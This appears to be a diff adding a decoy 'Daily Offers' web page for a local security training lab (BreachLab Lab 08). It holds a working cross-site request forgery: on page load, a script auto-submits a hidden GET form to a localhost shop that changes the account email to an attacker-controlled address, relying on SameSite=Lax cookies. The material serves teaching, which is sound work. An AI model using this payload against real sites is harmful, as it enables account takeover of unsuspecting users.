@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Daily Offers</title>
+  <style>
+    body{font:16px/1.5 Arial,sans-serif;max-width:680px;margin:12vh auto;padding:24px;color:#242424;background:#f5f3ef}
+    main{background:#fff;padding:32px;border:1px solid #ddd;border-radius:12px}
+    .fine{color:#777;font-size:13px}
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Today's member offer</h1>
+    <p>Loading your personalized offer…</p>
+    <p class="fine">This page is a local attacker-site simulation for BreachLab Lab 08.</p>
+    <form id="cross-site-request" method="get" action="http://localhost/BreachLab/target/shop/index.php">
+      <input type="hidden" name="action" value="change-email">
+      <input type="hidden" name="email" value="attacker-controlled@example.test">
+    </form>
+  </main>
+  <script>
+    // Top-level GET navigation: the browser may attach the shop's SameSite=Lax
+    // session cookie. This is intentionally used to demonstrate Lab 08 locally.
+    document.getElementById('cross-site-request').submit();
+  </script>
+</body>
+</html>
